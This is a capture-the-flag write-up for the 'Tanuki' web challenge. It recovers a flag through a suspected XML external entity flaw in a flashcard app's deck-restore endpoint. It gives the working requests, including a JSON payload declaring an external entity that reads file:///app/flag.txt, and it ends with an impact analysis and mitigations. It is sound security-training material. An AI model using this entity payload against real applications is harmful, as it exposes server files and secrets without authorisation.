# Tanuki — tanuki-008 — Can you restore decks?

## Overview

**Challenge:** Tanuki  
**Platform:** Bugforge  
**Category:** Web Security  
**Primary vulnerability:** XML External Entity (XXE) — suspected from observed behavior  
**Objective:** Recover the challenge flag by investigating the deck restoration functionality.

### Challenge Hint

> Can you restore decks?

The hint directs attention to the application's deck backup and restoration features.

---

## 1. Initial Reconnaissance

After registering a test account and logging in, the application displayed several existing decks.

The first endpoint examined was:

```http
GET /api/decks
```

The request returned HTTP `200 OK` and a JSON response containing the available decks.

An export operation was then performed on one of the decks.

### Exported Backup Format

The export response contained XML similar to the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE backup [
]>
<backup>
  <name>Planets &amp; Moons</name>
  <description>Learn about the planets in our solar system</description>
  <category>Astronomy</category>
  <cards>
    <card>
      <front>What is the largest planet in our solar system?</front>
      <back>Jupiter</back>
    </card>
  </cards>
</backup>
```

This established that the application uses XML for exported deck backups.

**Observation:** The presence of XML and a `DOCTYPE` declaration made XML parser behavior worth investigating, but did not independently establish an XXE vulnerability.

---

## 2. Discovering the Restore Endpoint

The next step was to restore an exported deck and inspect the associated network request.

The endpoint discovered was:

```http
POST /api/decks/1/restore
```

The initial request contained no body and returned:

```json
{
  "id": 4,
  "message": "Backup restored successfully",
  "cards_count": 0
}
```

The result showed that the endpoint could create a restored deck. However, the zero-card result did not explain how the backup data was being obtained or processed.

This led to further testing of the endpoint's input handling.

---

## 3. Testing XML Input

The restore request was modified to include XML with an internal entity declaration.

```http
POST /api/decks/1/restore
Content-Type: application/xml
```

Example request body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE backup [
  <!ENTITY test "XXE_WORKS">
]>
<backup>
  <name>&test;</name>
  <description>Test backup</description>
  <category>Test</category>
  <cards/>
</backup>
```

The server returned HTTP `200 OK` and created another deck.

However, the response alone did not confirm that the entity had been expanded. This test demonstrated that the endpoint accepted the request, not that external entity resolution was enabled.

---

## 4. Testing JSON Input

The next experiment changed the request content type to JSON.

```http
POST /api/decks/1/restore
Content-Type: application/json
```

The initial JSON test used the following structure:

```json
{
  "name": "JSON Test",
  "description": "Testing restore content type",
  "category": "Test",
  "cards": []
}
```

The server returned:

```json
{
  "id": 6,
  "message": "Backup restored successfully",
  "cards_count": 0
}
```

This established that the endpoint also accepted JSON-formatted requests.

The response suggested that the restore operation recognized the submitted data structure, although the response alone did not establish how every field was processed.

---

## 5. Crafting the Entity Payload

A subsequent request supplied a `dtd` property containing an external entity declaration and used `&xxe;` as the value of the deck metadata fields.

The payload was submitted as JSON to the restore endpoint.

```http
POST /api/decks/6/restore
Content-Type: application/json
```

Request body:

```json
{
  "dtd": "<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">",
  "name": "&xxe;",
  "description": "&xxe;",
  "category": "&xxe;",
  "cards": [
    {
      "front": "&xxe;",
      "back": "&xxe;"
    }
  ]
}
```

The server returned:

```json
{
  "id": 7,
  "message": "Backup restored successfully",
  "cards_count": 1
}
```

This created deck `7` with one card.

At this stage, the response confirmed successful restoration, but the flag had not yet been verified.

---

## 6. Retrieving the Flag

After refreshing the application, the newly created deck appeared in the deck list.

Opening the deck's study view triggered the following API request:

```http
GET /api/decks/7
```

The server returned:

```json
{
  "id": 7,
  "name": "bug{ySoO76BvUeaSzjBbwJKC8Zn6dEieX3s6}",
  "description": "bug{ySoO76BvUeaSzjBbwJKC8Zn6dEieX3s6}",
  "category": "bug{ySoO76BvUeaSzjBbwJKC8Zn6dEieX3s6}",
  "created_at": "2026-10-19 14:48:49",
  "card_count": 1
}
```

The flag was successfully recovered from the restored deck's metadata.

### Recovered Flag

```text
bug{ySoO76BvUeaSzjBbwJKC8Zn6dEieX3s6}
```

---

## 7. Attack Chain Summary

1. Register a test account and inspect the application's decks.
2. Export an existing deck and identify the XML backup format.
3. Discover the `POST /api/decks/:id/restore` endpoint.
4. Test how the endpoint handles XML and JSON requests.
5. Submit a crafted JSON payload containing a DTD declaration and entity references.
6. Observe the creation of a new deck.
7. Request `GET /api/decks/7` and inspect the returned metadata.
8. Recover the challenge flag.

---

## 8. Vulnerability Analysis

The observed behavior is consistent with unsafe processing of entity references during deck restoration.

The intended vulnerability appears to involve an external entity referencing:

```text
file:///app/flag.txt
```

The successful result demonstrates that the crafted restoration workflow led to the flag appearing in the returned deck metadata.

However, the exact backend mechanism was not directly inspected. The evidence does not independently prove whether the JSON `dtd` field was parsed as XML, passed to an XML parser through another processing step, or handled by custom application logic.

For a rigorous vulnerability report, the root cause should be described as **suspected XXE based on the observed exploit behavior**, unless source code or additional parser-specific evidence confirms the implementation.

---

## 9. Security Impact

If the restore handler permits attacker-controlled entity declarations to be processed by an XML parser with external entity resolution enabled, the vulnerability may allow:

- Reading sensitive local files accessible to the application process.
- Exposure of application secrets and challenge flags.
- Disclosure of internal information through restored deck metadata.
- Potential server-side request forgery if network-based external entities are permitted and reachable.

The actual impact depends on parser configuration, operating-system permissions, network access, and application behavior.

---

## 10. Recommended Mitigations

To prevent XXE and unsafe backup restoration:

1. Disable external entity resolution in the XML parser.
2. Disable DTD processing when it is not required.
3. Validate and strictly define the accepted backup format.
4. Reject unexpected fields such as arbitrary DTD declarations.
5. Avoid converting untrusted JSON fields into XML without safe serialization and validation.
6. Validate deck ownership and authorization on every restoration request.
7. Restrict the application's filesystem permissions and access to sensitive files.
8. Return generic error messages without exposing parser internals or sensitive data.
9. Add regression tests covering external entities, malformed XML, unexpected content types, and unauthorized deck IDs.

---

## Conclusion

The Tanuki challenge was solved by investigating the deck export and restore workflow, experimenting with XML and JSON input, and inspecting the metadata of the newly restored deck.

The decisive evidence was the response from `GET /api/decks/7`, which contained the recovered flag in the deck's name, description, and category.

The behavior is consistent with an XXE-related vulnerability in the restoration workflow, although confirming the exact parser-level root cause would require additional evidence.

**Status: Challenge completed — flag recovered.**